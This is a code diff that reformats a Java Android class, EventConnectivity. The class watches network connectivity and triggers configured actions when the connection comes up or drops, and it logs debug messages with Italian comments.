@@ -19,69 +19,77 @@ import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 
 public class EventConnectivity extends EventBase implements Observer<Connectivity> {
-		/** The Constant TAG. */
-		private static final String TAG = "EventConnectivity";
+	/** The Constant TAG. */
+	private static final String TAG = "EventConnectivity"; //$NON-NLS-1$
 
-		private int actionOnExit, actionOnEnter;
-		private boolean inRange = false;
-		
-		@Override
-		public void begin() {
-			ListenerConnectivity.self().attach(this);
-		}
+	private int actionOnExit, actionOnEnter;
+	private boolean inRange = false;
 
-		@Override
-		public void end() {
-			ListenerConnectivity.self().detach(this);
-		}
+	@Override
+	public void begin() {
+		ListenerConnectivity.self().attach(this);
+	}
 
-		@Override
-		public boolean parse(EventConf event) {
-			super.setEvent(event);
+	@Override
+	public void end() {
+		ListenerConnectivity.self().detach(this);
+	}
 
-			final byte[] conf = event.getParams();
+	@Override
+	public boolean parse(EventConf event) {
+		super.setEvent(event);
 
-			final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
-			
-			try {
-				actionOnEnter = event.getAction();
-				actionOnExit = databuffer.readInt();
-			} catch (final IOException e) {
-				if(Cfg.DEBUG) Check.log( TAG + " Error: params FAILED");
-				return false;
+		final byte[] conf = event.getParams();
+
+		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
+
+		try {
+			actionOnEnter = event.getAction();
+			actionOnExit = databuffer.readInt();
+		} catch (final IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: params FAILED") ;//$NON-NLS-1$
 			}
-			
-			return true;
+			return false;
 		}
 
-		@Override
-		public void go() {
-			// TODO Auto-generated method stub
+		return true;
+	}
+
+	@Override
+	public void go() {
+		// TODO Auto-generated method stub
+	}
+
+	// Viene richiamata dal listener (dalla dispatch())
+	public int notification(Connectivity c) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Got connectivity status notification: " + c.isConnected()) ;//$NON-NLS-1$
 		}
 
-		// Viene richiamata dal listener (dalla dispatch())
-		public int notification(Connectivity c) {
-			if(Cfg.DEBUG) Check.log( TAG + " Got connectivity status notification: " + c.isConnected());
-
-			// Nel range
-			if (c.isConnected() == true && inRange == false) {
-				inRange = true;
-				if(Cfg.DEBUG) Check.log( TAG + " Connectivity IN");
-				onEnter();
-			} else if (c.isConnected() == false && inRange == true) {
-				inRange = false;
-				if(Cfg.DEBUG) Check.log( TAG + " Connectivity OUT");
-				onExit();
+		// Nel range
+		if (c.isConnected() == true && inRange == false) {
+			inRange = true;
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Connectivity IN") ;//$NON-NLS-1$
 			}
-			
-			return 0;
-		}
-		
-		public void onEnter() {
-			trigger(actionOnEnter);
+			onEnter();
+		} else if (c.isConnected() == false && inRange == true) {
+			inRange = false;
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Connectivity OUT") ;//$NON-NLS-1$
+			}
+			onExit();
 		}
 
-		public void onExit() {
-			trigger(actionOnExit);
-		}
+		return 0;
+	}
+
+	public void onEnter() {
+		trigger(actionOnEnter);
+	}
+
+	public void onExit() {
+		trigger(actionOnExit);
+	}
 }
